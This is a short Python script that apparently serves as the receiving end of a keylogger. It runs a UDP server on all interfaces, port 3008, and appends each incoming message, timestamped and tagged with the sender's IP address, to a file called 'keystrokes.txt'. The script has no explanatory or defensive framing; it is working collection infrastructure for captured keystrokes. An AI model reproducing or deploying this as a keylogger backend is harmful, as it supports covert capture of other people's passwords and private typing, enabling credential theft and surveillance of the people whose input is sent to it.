import socketserver
from datetime import datetime

class LoggerServer(socketserver.BaseRequestHandler):


    def handle(self):
        data = self.request[0].strip().decode("utf-8")
        socket = self.request[1]
        print("{} wrote:".format(self.client_address[0]))
        print(data)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open("keystrokes.txt", "a") as f:
            f.write("[{}] {}: {}\n".format(timestamp, self.client_address[0], data))

host, port = "0.0.0.0", 3008

try:
    
    with socketserver.UDPServer((host, port), LoggerServer) as server:
        print("server started...")

        server.serve_forever()
except Exception as e:
    print("an error occurred:", e)
